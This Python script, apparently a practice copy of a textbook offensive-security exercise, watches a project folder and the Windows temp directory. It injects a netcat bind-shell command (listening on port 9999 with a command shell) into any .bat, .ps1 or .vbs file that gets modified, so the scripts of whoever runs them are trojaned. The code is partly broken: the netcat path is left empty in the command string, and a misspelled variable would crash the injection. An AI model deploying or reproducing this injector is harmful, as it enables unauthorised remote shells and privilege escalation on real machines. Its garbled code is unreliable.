import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001
PATHS = ["c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity", tempfile.gettempdir()]

NETCAT = "c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity\\dist\\netcat.exe"
TGT_IP = "10.0.1.5"
CMD = f'"""" -t {TGT_IP} -p 9999 -l -c'

FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n",f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n",f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return

    full_contents = FILE_TYPES[xtension][0]
    full_contents += FILE_TYPES[xtension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')
        
def monitor(path_to_watch):
    print("---monitor--")
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,                
                None,
                None
            )
    
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[*] Created {full_filename}')
            
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
            
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            print('[vvv] Dumping contents ...')
                            inject_code(full_filename, contents, extension)
                            #print(contents)
                            print('====================')
                            print('====================')
                            print('====================')                            
                            print('[^^^] Dump complete.')
                        except Exception as e:
                            print(f'[!!!] Dump failed. {e}')
            
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')            
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Renamed to {full_filename}')

        except KeyboardInterrupt:
            break
        
        except Exception:
            pass
        
            
if __name__ == "__main__":
    print("------------Start-------------")

    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()
        
#    filepath = "c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity"
#    monitor(filepath)

    print("-------------End--------------")    
